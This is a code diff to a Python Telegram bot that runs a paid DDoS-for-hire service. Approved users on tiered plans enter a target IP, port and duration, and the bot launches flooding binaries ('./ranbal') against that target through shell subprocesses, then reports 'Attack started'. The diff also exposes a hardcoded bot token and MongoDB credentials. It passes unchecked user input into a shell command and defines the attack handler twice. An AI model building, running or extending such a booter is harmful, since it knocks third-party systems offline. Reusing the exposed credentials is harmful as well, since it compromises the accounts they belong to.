@@ -16,12 +16,12 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7942937704:AAFM6qI8dd74bEuSu-E0UUqN0N9FioD4qa8'
+TOKEN = '710898551-XoLEabcya-NoQPHMPshc'
 MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
 FORWARD_CHANNEL_ID = -100
 CHANNEL_ID = -100
 error_channel_id = -100
-
+ADMIN_ID = 7083378335
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
@@ -70,22 +70,29 @@ def update_proxy():
     telebot.apihelper.proxy = {'https': proxy}
     logging.info("Proxy updated successfully.")
 
+@bot.message_handler(commands=['update_proxy'])
+def update_proxy_command(message):
+    chat_id = message.chat.id
+    try:
+        update_proxy()
+        bot.send_message(chat_id, "Proxy updated successfully.")
+    except Exception as e:
+        bot.send_message(chat_id, f"Failed to update proxy: {e}")
+
 async def start_asyncio_loop():
     while True:
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    # Run both commands simultaneously
-    command_1 = f"./2111 {target_ip} {target_port} {duration} 800"
-    command_2 = f"./ranbal {target_ip} {target_port} {duration} 800"
+    process = await asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration} 800")
+    await process.communicate()
 
-    # Create subprocesses for both commands
-    process_1 = asyncio.create_subprocess_shell(command_1)
-    process_2 = asyncio.create_subprocess_shell(command_2)
+def is_user_admin(user_id, chat_id):
+    try:
+        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
+    except:
+        return False
 
-    # Wait for both processes to complete
-    await asyncio.gather(process_1, process_2)
-    
 @bot.message_handler(commands=['approve', 'disapprove'])
 def approve_or_disapprove_user(message):
     user_id = message.from_user.id
@@ -133,7 +140,30 @@ def approve_or_disapprove_user(message):
 
     bot.send_message(chat_id, msg_text, parse_mode='Markdown')
     bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
-    
+@bot.message_handler(commands=['Attack'])
+def attack_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    try:
+        user_data = users_collection.find_one({"user_id": user_id})
+        if not user_data or user_data['plan'] == 0:
+            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
+            return
+
+        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
+            bot.send_message(chat_id, "Your Instant Plan 🧡 is currently not available due to limit reached.")
+            return
+
+        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
+            bot.send_message(chat_id, "Your Instant++ Plan 💥 is currently not available due to limit reached.")
+            return
+
+        bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces.")
+        bot.register_next_step_handler(message, process_attack_command)
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+
 @bot.message_handler(commands=['Attack'])
 def attack_command(message):
     user_id = message.from_user.id
@@ -171,8 +201,7 @@ def process_attack_command(message):
             return
 
         asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode
-        ='Markdown')
+        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
 
